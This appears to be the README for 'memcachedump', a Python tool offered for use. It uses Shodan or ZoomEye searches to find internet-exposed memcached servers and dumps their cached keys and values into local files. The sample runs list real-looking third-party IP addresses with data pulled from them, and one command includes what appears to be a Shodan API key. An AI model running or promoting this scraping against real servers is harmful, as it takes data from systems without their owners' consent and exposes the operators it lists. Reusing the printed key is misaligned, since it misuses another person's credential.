![memcachedump Infographic](https://github.com/JLospinoso/memcachedump/raw/master/memcachedump.png)

`memcachedump` is a tool for dumping the cache contents of exposed memcached servers into local text files.

You'll need Python 3 along with [Shodan API Key](https://developer.shodan.io/api) or [ZoomEye Credentials](https://www.zoomeye.org/).

# Running the tool:

```
> python mcd.py --help
usage: mcd.py [-h] [--key KEY] [--email EMAIL] [--password PASSWORD] [--out OUT] [--json]

Scrape data from memcached servers.

optional arguments:
  -h, --help           show this help message and exit
  --key KEY            Shodan API key.
  --email EMAIL        ZoomEye Email.
  --password PASSWORD  ZoomEye Password.
  --out OUT            Output directory for caches.
  --json               Output as JSON. (Default: CSV)
```

You must supply your Shodan API `--key` or ZoomEye Credentials `--email xyz@xyz.com --password xyz`. 

Optionally, you can specify an `--out` directory for the text files. By default, `mcd` writes to `./out`.

You can also specify `--json` output. By default, writes a CSV file.

# Example usage

```
> git clone git@github.com:JLospinoso/memcachedump.git
> cd memcachedump
> pip3 install shodan
```

### Using Shodan API Key
```
> python3 mcd.py --key kpVD7oF01vn1I9q6AfqGeqA2wkqJu9up
Results found: 108877
[ ] Found memcached server at IP: 115.159.38.63
[ ] Found memcached server at IP: 37.220.12.242
[ ] Found memcached server at IP: 115.182.69.234
[ ] Found memcached server at IP: 37.187.205.112
[ ] Found memcached server at IP: 65.175.106.142
[ ] Found memcached server at IP: 217.112.131.172
[ ] Found memcached server at IP: 43.246.216.225
[ ] Found memcached server at IP: 123.30.189.230
...
[ ] Connecting to 115.159.38.63.
[ ] Found 5 key lengths at 115.159.38.63.
[ ] Found 5 keys at 115.159.38.63.
[-] Error connecting to 115.159.38.63: 'utf-8' codec can't decode byte 0xff in position 36: invalid start byte
[ ] Connecting to 37.220.12.242.
[ ] Found 1 key lengths at 37.220.12.242.
[ ] Found 1 keys at 37.220.12.242.
[ ] Dumped 1 key values from 37.220.12.242.
[+] Wrote CSV to out\37.220.12.242.csv
[ ] Connecting to 115.182.69.234.
[ ] Found 1 key lengths at 115.182.69.234.
[ ] Found 1 keys at 115.182.69.234.
[ ] Dumped 1 key values from 115.182.69.234.
[+] Wrote CSV to out\115.182.69.234.csv
[ ] Connecting to 37.187.205.112.
[ ] Found 1 key lengths at 37.187.205.112.
[ ] Found 2 keys at 37.187.205.112.
...
```

### Using ZoomEye Credentials
```
> python3 mcd.py --email xyz@xyz.com --password xyz123abc
[ ] Found memcached server at IP: 115.159.38.63
[ ] Found memcached server at IP: 37.220.12.242
[ ] Found memcached server at IP: 115.182.69.234
[ ] Found memcached server at IP: 37.187.205.112
[ ] Found memcached server at IP: 65.175.106.142
[ ] Found memcached server at IP: 217.112.131.172
[ ] Found memcached server at IP: 43.246.216.225
[ ] Found memcached server at IP: 123.30.189.230
...
[ ] Connecting to 115.159.38.63.
[ ] Found 5 key lengths at 115.159.38.63.
[ ] Found 5 keys at 115.159.38.63.
[-] Error connecting to 115.159.38.63: 'utf-8' codec can't decode byte 0xff in position 36: invalid start byte
[ ] Connecting to 37.220.12.242.
[ ] Found 1 key lengths at 37.220.12.242.
[ ] Found 1 keys at 37.220.12.242.
[ ] Dumped 1 key values from 37.220.12.242.
[+] Wrote CSV to out\37.220.12.242.csv
[ ] Connecting to 115.182.69.234.
[ ] Found 1 key lengths at 115.182.69.234.
[ ] Found 1 keys at 115.182.69.234.
[ ] Dumped 1 key values from 115.182.69.234.
[+] Wrote CSV to out\115.182.69.234.csv
[ ] Connecting to 37.187.205.112.
[ ] Found 1 key lengths at 37.187.205.112.
[ ] Found 2 keys at 37.187.205.112.
...
```

All results output to the `out` directory.